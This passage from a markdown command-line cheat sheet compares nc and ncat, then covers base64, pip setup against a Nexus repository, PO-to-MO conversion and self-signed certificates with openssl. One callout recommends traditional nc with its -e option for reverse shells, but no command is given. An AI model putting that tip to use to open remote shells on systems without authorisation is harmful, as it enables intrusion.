| File Transfer          | ✅ Yes                 | ✅ Yes                    |
| Listen Mode            | ✅ Yes (`-l`)          | ✅ Yes                    |
| Execute Program (`-e`) | ✅ Yes (in traditional)| ❌ Disabled for security   |
| SSL Support            | ❌ No                  | ✅ Yes (`--ssl`)           |
| IPv6 Support           | ⚠️ Varies              | ✅ Yes                    |
| Built-in with Nmap     | ❌ No                  | ✅ Yes                    |

> ✅ Use `ncat` when you need encryption or Nmap integration.  
> ⚠️ Use traditional `nc` for reverse shells (ensure `-e` is supported).

---

<a id="miscellaneous-tools"></a>
## 2.15 🧪 Miscellaneous Tools [🔝](#table-of-contents)


<a id="base-64"></a>
### 2.15.1 Base 64 [🔝](#table-of-contents)

```bash
echo "string" | base64;
echo "string" | base64 --decode; echo
```


<a id="configure-pip-with-nexus"></a>
### 2.15.2 Configure pip with Nexus [🔝](#table-of-contents)

**pip.conf (Linux/macOS)**:

```ini
[global]
index-url = https://your-nexus-url/repository/pypi-proxy/simple
trusted-host = your-nexus-url
cert = /path/to/cert.pem
```

**Environment Variables**:

```bash
export NEXUS_USERNAME=my_user
export NEXUS_PASSWORD=my_pass
```

Add to `~/.bashrc` and run `source ~/.bashrc`

**Check Config**:

```bash
pip config debug
pip show package-name
pip -v search package-name
```

**Windows Config (pip.ini)**: Location: `C:\Users\YourName\AppData\Roaming\pip\pip.ini`

```ini
[global]
index-url = https://nexus-server/repository/simple
trusted-host = nexus-server
cert = C:\Users\username\AppData\Roaming\pip\nexus.pem
```

```cmd
setx NEXUS_USERNAME your_username
setx NEXUS_PASSWORD your_password
```

---

<a id="po-to-mo-file-conversion"></a>
## 2.16 🔁 PO to MO File Conversion [🔝](#table-of-contents)

```bash
msgfmt -o output.mo input.po
```

---

<a id="create-a-self-signed-ssl-certificate"></a>
## 2.17 🔐 Create a Self-Signed SSL Certificate [🔝](#table-of-contents)

```bash
# Generate Private Key
openssl genpkey -algorithm RSA -out private-key.pem

# Create CSR (optional if self-signed)
openssl req -new -key private-key.pem -out csr.pem

# Generate Certificate
openssl req -x509 -key private-key.pem -in csr.pem -out certificate.pem

# Encrypt Private Key
openssl rsa -aes256 -in private-key.pem -out encrypted-private-key.pem
```

> Self-signed certificates are good for testing. For production, use a trusted Certificate Authority (CA).